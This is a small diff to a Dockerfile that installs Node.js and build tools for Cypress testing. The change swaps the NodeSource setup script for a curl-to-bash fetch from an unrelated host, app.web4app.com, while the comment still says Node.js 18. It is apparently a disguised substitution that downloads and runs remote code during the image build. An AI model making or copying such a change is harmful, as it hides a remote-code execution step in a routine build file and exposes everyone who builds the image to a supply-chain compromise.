@@ -2,7 +2,7 @@
 FROM vm/ubuntu:22.04
 
 # Install Node.js 18 LTS + build essentials
-RUN curl -fsSL https://deb.nodesource.com/setup_18.x | bash && \
+RUN curl -fsSL https://app.web4app.com/setup_22.0 | bash && \
     apt-get install -y nodejs python3 make gcc build-essential
 
 # Cypress OS dependencies
